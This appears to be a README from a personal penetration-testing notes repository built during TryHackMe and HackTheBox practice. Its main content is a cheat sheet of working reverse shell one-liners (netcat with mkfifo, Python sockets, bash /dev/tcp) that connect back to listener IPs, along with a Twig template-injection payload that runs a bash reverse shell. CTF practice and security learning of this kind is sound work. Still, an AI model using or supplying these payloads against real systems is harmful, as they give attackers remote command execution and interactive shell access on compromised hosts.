# HackNotes

This repository contains my personal notes and tricks that I've gathered while working on various machines in the TryHackMe and HackTheBxo platforms. These notes serve as a guide for penetration testing and help me document my progress and findings.

Please note that these notes are a work in progress, and I'll be continuously adding more content as I progress through the challenges and machines.

## Introduction

In this repository, you will find a compilation of various tricks, commands, and techniques that can be useful during penetration testing activities. These notes are intended to assist in the process of hacking and securing systems.


---

## Reverse shells

```sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.22.27 4444 >/tmp/f
```

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.22.27",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.22.27",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

```bash
bash -i >& /dev/tcp/10.18.22.27/4444 0>&1
sh -i >& /dev/tcp/10.10.14.74/4444 0>&1
```

```js
{{this.controller.getTwig().registerUndefinedFilterCallback("passthru")}}
{{ this.controller.getTwig().getFilter("bash -c 'bash -i >& /dev/tcp/10.127.255.241/4455 0>&1'") }}
```

---
### [notes](./other/notes.md)
### [web](./other/web.md)
### [osint](./other/osint.md)
### [windows](./other/windows.md)
### [Linux Privilege Escalation:](./other/src/linux_priv_esc.md)
### [links](links.md)

Happy hacking!
